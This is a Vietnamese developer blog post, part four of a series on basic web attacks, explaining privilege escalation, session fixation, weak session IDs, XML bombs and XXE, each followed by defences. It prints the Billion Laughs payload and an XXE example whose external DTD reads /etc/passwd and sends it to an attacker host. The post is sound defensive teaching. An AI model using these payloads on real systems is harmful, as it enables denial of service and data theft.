## [Part 1](https://viblo.asia/p/cac-ki-thuat-hack-co-ban-lap-trinh-vien-nen-biet-phan-1-gDVK2BvrKLj)
## [Part 2](https://viblo.asia/p/cac-ki-thuat-hack-co-ban-lap-trinh-vien-nen-biet-phan-2-4dbZN92gKYM)
## [Part 3](https://viblo.asia/p/cac-ki-thuat-hack-co-ban-lap-trinh-vien-nen-biet-phan-3-bWrZnWQ9lxw)
## Part 4
### Privilege Escalation - Leo thang đặc quyền
Là bằng một cách nào đó mà Hacker chiếm được quyền hạn, của người dùng cấp cao hơn. Cái này khác một chút với việc chiếm tài khoản hay cookie của người dùng cấp cao hơn, thay vì sử dụng tài khoàn của người khác, hacker sẽ lợi dụng các kẽ hở, đẩy thông tin sai lệch để hệ thống nhầm lẫn rằng họ là người dùng cấp cao và cho phép thực hiện hành động.

![sửa lại cookie thành người dùng cấp cao](https://images.viblo.asia/7ce3823d-a16d-4ed9-a28d-5b89223217d2.png)

![thanh đổi thông tin form đển đẩy thông tin sai lệch](https://images.viblo.asia/3d51a155-85eb-4a35-92de-213b6c273a24.png)

#### Phòng chống
##### 1. Giữ thông tin nhạy cảm ở phía máy chủ
Điều này nghĩa là chỉ có session ID được đẩy qua lại giữa client và server, mọi thông tin liên quan đều được giữ ở server, hacker sẽ không thể giả mạo do không biết được có thông tin gì
##### 2. Tamper-Proofing Cookies
Bạn có thể thêm chữ kí điện tử để tránh việc dữ liệu bị giả mạo
##### 3. Mã hóa dữ liệu

https://viblo.asia/p/leo-thang-dac-quyen-trong-windows-windows-privilege-escalation-1-service-exploits-vyDZO7QOZwj

### Session Fixation
Là kĩ thuật chiếm đoạt session của người dùng, bằng việc lợi dụng việc website không thay đổi session id mỗi khi đăng nhập mà sử dụng session trước đó, hacker có thể lừa người dùng đăng nhập bằng 1 session hợp lệ do hắn tạo ra, sau đó hacker chỉ cần dùng session đó là có thể truy cập vào tài khoản người dùng

Kịch bản như sau:
+ Hacker tìm thấy 1 trang web nhận session id từ reqest mà không xác thực, như là `http://example.com`
+ Hắn gửi cho nạn nhân một đường link dạng `http://example.com?sessionId=abcd` hoặc `http://example.com/document.cookie=”sessionId=abcd”;`
+ Nạn nhân truy cập link trên và đăng nhập
+ Sau đó hacker cũng truy cập link trên và dùng tài khoản của nạn nhân

#### Phòng chống
##### 1. Không truyền Session ID trong biến GET/POST
Không chỉ giúp hacker có thể tạo link độc mà còn có thể làm lộ session id. Tốt hơn là dùng HTTP cookie ấy
##### 2. Tạo lại session ID khi xác thực
Lúc đó thì cái session id hacker gửi cho bạn thành vô dụng :+1:
##### 3. Chỉ chấp nhận session ID được tạo ở phía server
Nghe hay đấy, cũng tốt nữa, nhưng về cơ bản thì nó không có giải quyết được vấn đề này =))
##### 4. Đặt Timeout và thay thế session ID cũ
##### 5. Triển khai logout function đủ mạnh
##### 6. Yêu cầu Session mới khi truy cập từ Referrers đáng ngờ

### Weak session ids
Cái này dễ hiểu, là trường hợp session id có thể tính toán hoặc dễ đoán, như id người dùng, hoặc id người dùng + abc chả hạn =)))

Sau khi tìm ra quy tắc rồi thì hacker có thể ung dung ngồi sửa session để đăng nhập mà chả cần ngồi chờ brute force, hay tìm mấy lỗi lằng nhằng phụ thuộc vào nạn nhân như XSS

#### Phòng chống
##### 1. Sử dụng công cụ quản lý session
Không chắc gọi là "công cụ" thì có chuẩn xác không, nhưng ý tôi là mấy cái framework bây giờ chắc đều hỗ trợ quản lý session cả rồi, cứ dùng thôi chứ cũng không cần cố sáng tạo, viết ra cái mới làm gì :+1:
##### 2. Chống giả mạo cookie
Thêm chữ ký điện tử, giống cái Tamper-Proofing Cookies ở phần Leo thang đặc quyền phía trên ấy

### XML Bombs
Một đoạn code XML nhỏ nhắn, xinh xắn, và tuân thủ luật pháp, nhưng khi chạy bằng trình biên dịch sẽ tạo ra dữ liệu lớn khủng khiếp đến mức treo luôn cả server, cũng là một dạng tấn công từ chối dịch vụ

VD như [Billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack), source từ wikipedia

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

Như các bạn thấy, lô in ra lol, lô2 in ra 10 lần lô, lô3 in ra 10 lần lô2.... => từ một đoạn code nhỏ xinh đã in ra 10^9 lol = 1.000.000.000 lol

Để các bạn dễ hình dung nó nhiều đến thế nào thì, một bộ tiên hiệp tàu 2000 chương cũng chỉ khoảng trên dưới 3.000.000 chữ

Tưởng tượng đó không chỉ là một chữ 'lol' mà là cả một bài viết như các bạn đang đọc chẳng hạn, sập là cái chắc =))

#### Phòng chống
##### 1. Disable Parsing of Inline DTDs (document type definitions)
##### 2. Consider Making XML Parsing Asynchronous
##### 3. Throttle Uploads Per Client


### XML External Entities
Vòng lại ví dụ phía trên môt chút, dòng `!DOCTYPE` được gọi tắt là DTD, trong ví dụ trên là inline DTD, ngoài ra còn có thêm một cái nữa là External DTD. Ngược lại với inline, là khái báo các entity trực tiếp trong file, External DTD là định nghĩa DTD ra một file riêng khác file XML được sử dụng.

Kiểu vậy (source [w3school](https://www.w3schools.com/xml/xml_dtd.asp))
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "Note.dtd">
<note>
<to>Tove</to>
<from>Jani</from>
<heading>Reminder</heading>
<body>Don't forget me this weekend!</body>
</note>
```

Với file note.dtd dạng vậy
```xml
<!DOCTYPE note
[
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
]>
```

Lý thuyết vậy được rồi, giờ quay lại với vấn đề lỗ hổng bảo mật nay.

Về cơ bản, hacker sẽ lợi dụng việc gọi file dtd từ bên ngoài này, họ sẽ gủi một yêu cầu chứa dữ liệu XML (Content-Type: text/xml), phân khai báo đến DTD ngoài nằm trên server của hacker.
```xml
POST /login HTTP/1.1
Host: vulnerable
Connection: close
Content-Type: text/xml
Content-Length: 97

<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://192.168.159.1:3000/test.dtd">
<foo>&e1;</foo>
```

File DTD kiểu vậy
```xml
<!ENTITY % p1 SYSTEM "file:///etc/passwd">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://192.168.159.1:3001/BLAH?%p1;'>">
%p2;
```

Khi ứng dụng thực hiện phân tích dữ liệu XML với phần DTD như trên, trình phân tích XML sẽ đọc nội dung tệp /etc/passwd trong hệ thống và gán vào biến p1. Sau đó một biến p2 khác được tạo chứa liên kết đến server attacker và giá trị của p1 (là nội dung file /etc/passwd). Sau đó nó sẽ in giá trị của p2 thông qua khai báo %p2

Nguồn tham khảo :
+ https://viblo.asia/p/xml-external-entity-xxe-injection-07LKX97pZV4
+ https://whitehat.vn/threads/xml-external-entity-processing.5489/
+ https://pentesterlab.com/exercises/play_xxe/course


#### Phòng chống
##### 1. Disable Parsing of Inline DTDs
##### 2. Limit the Permissions of Your Web Server Process